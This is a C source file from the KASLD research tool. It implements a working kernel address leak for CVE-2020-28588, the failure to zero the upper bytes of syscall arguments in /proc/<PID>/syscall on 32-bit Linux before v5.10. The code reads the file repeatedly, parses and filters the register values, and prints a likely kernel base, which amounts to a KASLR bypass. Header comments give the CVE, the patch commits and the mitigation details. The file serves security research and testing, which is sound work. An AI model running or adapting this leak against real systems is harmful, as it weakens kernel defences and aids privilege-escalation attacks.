// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve process syscall argument registers from /proc/<PID>/syscall
// which may leak uninitialized kernel stack memory from collect_syscall()
// on 32-bit systems (ARM/x86_32/...) (CVE-2020-28588).
// Discovered by Lilith >_> and Claudio Bozzato of Cisco Talos.
//
// Introduced in kernel v5.1-rc4 on 2019-04-04:
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=631b7abacd02b88f4b0795c08b54ad4fc3e7c7c0
//
// Patched in kernel v5.10-rc7~25 on 2020-12-03.
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f134b89a24b965991e7c345b9a4591821f7c2a6
//
// Leak primitive:
//   Data leaked:      kernel stack data (uninitialized upper bytes of syscall
//   args) Kernel subsystem: fs/proc — /proc/<PID>/syscall (collect_syscall)
//   Data structure:   struct syscall_info → data.args[] (upper 32 bits on
//   32-bit) Address type:     virtual (kernel stack) Method:           parsed
//   CVE:              CVE-2020-28588
//   Patched:          v5.10 (commit 4f134b89a24b)
//   Status:           fixed in v5.10
//   Access check:     none pre-v5.10 (world-readable /proc/<PID>/syscall)
//   Source: https://elixir.bootlin.com/linux/v5.9/source/fs/proc/base.c
//
// Mitigations:
//   Patched in v5.10. No runtime sysctl could restrict access — the bug was
//   in collect_syscall() failing to zero upper bytes of 64-bit arg fields on
//   32-bit systems. Only affects 32-bit kernels (ARM, x86_32, etc.).
//
// Requires:
// - CONFIG_HAVE_ARCH_TRACEHOOK=y
//
// References:
// https://talosintelligence.com/vulnerability_reports/TALOS-2020-1211
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=631b7abacd02b88f4b0795c08b54ad4fc3e7c7c0
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=4f134b89a24b965991e7c345b9a4591821f7c2a6
// https://cateee.net/lkddb/web-lkddb/HAVE_ARCH_TRACEHOOK.html
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/kasld.h"
#include <errno.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

KASLD_EXPLAIN(
    "Reads /proc/<PID>/syscall on a 32-bit kernel. The file reports six "
    "64-bit argument registers, but on 32-bit only the lower 32 bits are "
    "used. Before the v5.10 fix (CVE-2020-28588), the upper 32 bits were "
    "not zeroed, leaking stale kernel stack data that often contains "
    "kernel text or stack pointers.");

KASLD_META("method:exact\n"
           "addr:virtual\n"
           "cve:CVE-2020-28588\n"
           "patch:v5.10\n"
           "config:CONFIG_HAVE_ARCH_TRACEHOOK\n");

unsigned long get_kernel_addr_proc_pid_syscall() {
  FILE *f;
  int iterations = 10;
  unsigned long addr = 0;
  unsigned long leaked_addr = 0;
  const char *cmd = "/bin/cat /proc/self/syscall";
  char buff[1024];
  char *ptr;
  char *endptr;

  printf("[.] checking /proc/self/syscall argument registers ...\n");

  int i;
  for (i = 0; i < iterations; i++) {
    // Reading with cat using popen() in a separate process
    // leaks lower addresses than reading with fopen()
    f = popen(cmd, "r");
    if (f == NULL) {
      perror("[-] popen");
      return 0;
    }

    if (fgets(buff, sizeof(buff), f) == NULL) {
      perror("[-] fgets");
      pclose(f);
      return 0;
    }

    // printf("/proc/self/syscall: %s", buff);

    pclose(f);

    /* Lazy implementation. In practice we only want data after the first 24
     * bytes (from the fifth value onwards).
     *
     * $ cat /proc/self/syscall
     * 0 0x76f7300000000003 0x4000 0x0 0x8050389c8098fde4 0xee297df0ee297e2c ...
     *                                   ^       ^
     */
    ptr = strtok(buff, " ");
    while ((ptr = strtok(NULL, " ")) != NULL) {
      int reg_addr_len = strlen(ptr);

      // Registers are printed without leading zeros. (0x00001234 -> "0x1234"),
      // possibly concatenated (0x0000abcd and 0x12345678 -> "0xabcd12345678").
      //
      // We presume all register values are either 10 characters long for
      // a single register value (8 character address with "0x" prefix) or
      // between 11 and 18 characters long for concatenated registers.
      //
      // This usually works fine, but this means we'll miss kernel pointers if
      // the kernel is mapped below 0x10000000 (ie, phys mapped at 0x0008000).
      if (reg_addr_len < 10 || reg_addr_len > 18)
        continue;

      unsigned long long reg_addr = strtoull(&ptr[0], &endptr, 16);

      if (!reg_addr)
        continue;

      if (reg_addr_len == 10) {
        // register argument is a single pointer.
        leaked_addr = reg_addr;
      } else if (reg_addr_len > 10 && reg_addr_len <= 18) {
        // register argument is two concatenated pointers.
        // split it and choose the lowest of the two.
        unsigned long a = reg_addr >> 32;
        unsigned long b = reg_addr & 0xffffffff;

        /* Use PAGE_OFFSET as lower bound rather than KERNEL_BASE_MIN.
         * On 32-bit with 3G/1G split, KERNEL_BASE_MIN (0x40000000) overlaps
         * user-space, causing user register values (SP, LR, mmap addresses)
         * to be misidentified as kernel pointers. Kernel stack addresses
         * leaked by CVE-2020-28588 are always >= PAGE_OFFSET. */
        if (a < PAGE_OFFSET && b < PAGE_OFFSET)
          continue;

        if (a >= PAGE_OFFSET && b >= PAGE_OFFSET) {
          if (a < b) {
            leaked_addr = a;
          } else {
            leaked_addr = b;
          }
        } else if (a >= PAGE_OFFSET) {
          leaked_addr = a;
        } else if (b >= PAGE_OFFSET) {
          leaked_addr = b;
        }
      } else {
        continue;
      }

      if (!leaked_addr)
        continue;

      if (leaked_addr >= PAGE_OFFSET && leaked_addr <= KERNEL_BASE_MAX) {
        // printf("Found kernel pointer: %lx\n", leaked_addr);
        if (!addr || leaked_addr < addr)
          addr = leaked_addr;
      }
    }
  }

  return addr;
}

int main(void) {
  unsigned long addr = get_kernel_addr_proc_pid_syscall();
  if (!addr) {
    printf("[-] no kernel address found in /proc/pid/syscall\n");
    return 0;
  }

  printf("lowest leaked address: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr, "proc-pid-syscall");

  return 0;
}
